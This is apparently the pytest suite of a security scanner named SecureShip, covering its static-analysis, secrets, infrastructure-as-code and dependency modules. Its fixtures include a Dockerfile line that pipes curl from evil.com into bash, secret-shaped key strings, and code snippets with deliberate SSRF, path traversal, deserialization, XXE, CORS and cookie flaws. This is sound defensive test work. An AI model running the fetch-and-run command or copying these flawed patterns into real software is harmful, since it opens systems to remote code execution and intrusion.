import os
from pathlib import Path
from typer.testing import CliRunner

from secureship.cli import app
from secureship.models import Confidence, FindingCategory, Severity
from secureship.scanners.iac_scanner import IaCScanner
from secureship.scanners.sast_scanner import SASTScanner
from secureship.scanners.sca_scanner import SCAScanner
from secureship.scanners.secrets_scanner import SecretsScanner
from secureship.scanner import SecureShipEngine

runner = CliRunner()


def test_high_accuracy_false_positive_elimination():
    """Verify that safe static literals and patterns are NOT falsely flagged."""
    sast = SASTScanner()
    secrets = SecretsScanner()

    # 1. Static constant SQL query should NOT trigger SAST-PY-001
    safe_sql = """
def get_active_users():
    cursor.execute("SELECT id, name FROM users WHERE active = 1")
    cursor.execute("SELECT * " + "FROM orders")
    """
    findings = sast.scan_file(Path("safe.py"), "safe.py", safe_sql)
    assert not any(f.rule_id == "SAST-PY-001" for f in findings)

    # 2. Safe static innerHTML should NOT trigger SAST-JS-002
    safe_js = """
const el = document.getElementById("header");
el.innerHTML = "<h1>Welcome to SecureShip</h1>";
    """
    # 3. UUIDs, test dummy keys, commit hashes should NOT trigger secrets scanner
    safe_secrets = """
trace_id = "12345678-1234-1234-1234-123456789abc"
git_commit_sha = "abcdef1234567890abcdef1234567890abcdef12"
dummy_key = "AKIAEXAMPLETESTPLACEHOLDER"
password = "placeholder"
    """
    secret_findings = secrets.scan_file(Path("safe.py"), "safe.py", safe_secrets)
    assert len(secret_findings) == 0


def test_new_secrets_detection():
    """Verify detection of modern AI keys, Slack webhooks, Stripe, GCP, and passwords."""
    scanner = SecretsScanner()
    content = """
openai_key = "sk-proj-abc1234567890abcdef1234567890abcdef1234567890abcd"
anthropic_key = "sk-ant-api03-abcdef1234567890abcdef1234567890abcdef12345"
slack_webhook = "https://hooks.slack.com/services/T12345678/B12345678/abcdefghijklmnopqrstuvwx"
stripe_key = "sk_live_1234567890abcdefghijklmn"
gcp_api_key = "AIzaSyAbcdEfghIjklMnOpQrStUvWxYz12345"
db_password = "SuperSecretPassword123!"
    """
    findings = scanner.scan_file(Path("secrets.py"), "secrets.py", content)
    rule_ids = {f.rule_id for f in findings}

    assert "SEC-007" in rule_ids  # AI key
    assert "SEC-008" in rule_ids  # Slack Webhook
    assert "SEC-009" in rule_ids  # Stripe
    assert "SEC-010" in rule_ids  # GCP
    assert "SEC-011" in rule_ids  # Password assignment


def test_new_python_sast_rules():
    """Verify detection of SSRF, Path Traversal, Deserialization, and XXE in Python."""
    scanner = SASTScanner()
    code = """
import requests
import xml.etree.ElementTree as ET
import marshal
import os

def handle_request(user_url, user_path, blob):
    # SSRF
    resp = requests.get(user_url)
    # Path Traversal
    with open(os.path.join("/base/uploads", user_path), "r") as f:
        data = f.read()
    # Insecure Deserialization
    obj = marshal.loads(blob)
    # XXE
    tree = ET.parse("untrusted.xml")
    return resp.text
    """
    findings = scanner.scan_file(Path("vuln.py"), "vuln.py", code)
    rule_ids = {f.rule_id for f in findings}

    assert "SAST-PY-010" in rule_ids  # SSRF
    assert "SAST-PY-011" in rule_ids  # Path Traversal
    assert "SAST-PY-012" in rule_ids  # marshal Deserialization
    assert "SAST-PY-014" in rule_ids  # XXE


def test_new_javascript_sast_rules():
    """Verify detection of SSRF, Path Traversal, Prototype Pollution, CORS, and Cookie flaws."""
    scanner = SASTScanner()
    code = """
const axios = require('axios');
const fs = require('fs');

app.get('/fetch', (req, res) => {
    axios.get(req.query.url);
    fs.readFile(req.query.file, 'utf8', (err, data) => {});
    const clean = Object.assign({}, req.body);
    res.cookie('session', 'xyz', { httpOnly: false });
});

app.use(cors({ origin: "*" }));
    """
    findings = scanner.scan_file(Path("server.js"), "server.js", code)
    rule_ids = {f.rule_id for f in findings}

    assert "SAST-JS-007" in rule_ids  # SSRF
    assert "SAST-JS-008" in rule_ids  # Path Traversal
    assert "SAST-JS-009" in rule_ids  # Prototype Pollution
    assert "SAST-JS-010" in rule_ids  # Permissive CORS
    assert "SAST-JS-011" in rule_ids  # Insecure Cookie


def test_new_iac_rules():
    """Verify Dockerfile ADD, curl|sh, Compose docker.sock, network_mode host, K8s privilege escalation."""
    scanner = IaCScanner()

    dockerfile = """
    FROM python:3.11-slim
    ADD archive.tar.gz /app/
    RUN curl -s https://evil.com/setup.sh | bash
    USER appuser
    CMD ["python", "app.py"]
    """
    df_findings = scanner.scan_file(Path("Dockerfile"), "Dockerfile", dockerfile)
    df_rules = {f.rule_id for f in df_findings}
    assert "IAC-DOCKER-004" in df_rules  # ADD instruction
    assert "IAC-DOCKER-005" in df_rules  # curl | bash

    compose = """
    version: '3.8'
    services:
      app:
        network_mode: "host"
        volumes:
          - /var/run/docker.sock:/var/run/docker.sock
    """
    comp_findings = scanner.scan_file(Path("docker-compose.yml"), "docker-compose.yml", compose)
    comp_rules = {f.rule_id for f in comp_findings}
    assert "IAC-COMPOSE-003" in comp_rules  # docker.sock
    assert "IAC-COMPOSE-004" in comp_rules  # host network

    k8s = """
    apiVersion: v1
    kind: Pod
    metadata:
      name: test-pod
    spec:
      containers:
        - name: app
          securityContext:
            allowPrivilegeEscalation: true
            readOnlyRootFilesystem: false
    """
    k8s_findings = scanner.scan_file(Path("pod.yaml"), "pod.yaml", k8s)
    k8s_rules = {f.rule_id for f in k8s_findings}
    assert "IAC-K8S-003" in k8s_rules  # privilege escalation
    assert "IAC-K8S-004" in k8s_rules  # writable root


def test_new_sca_cves():
    """Verify detection of newly added critical CVEs in dependencies."""
    scanner = SCAScanner()

    reqs = """
    jinja2==3.1.2
    werkzeug==3.0.1
    pillow==10.0.0
    cryptography==41.0.5
    paramiko==3.3.1
    """
    findings = scanner.scan_file(Path("requirements.txt"), "requirements.txt", reqs)
    titles = [f.title for f in findings]
    assert any("Jinja2" in t for t in titles)
    assert any("Werkzeug" in t for t in titles)
    assert any("Pillow" in t for t in titles)
    assert any("cryptography" in t for t in titles)
    assert any("Paramiko" in t for t in titles)


def test_confidence_filtering_cli():
    """Verify that --confidence high filters out lower-confidence heuristics."""
    result = runner.invoke(app, ["scan", "./demo-vulnerable-app", "--confidence", "high", "--format", "json"])
    assert result.exit_code == 0
    assert "findings" in result.output
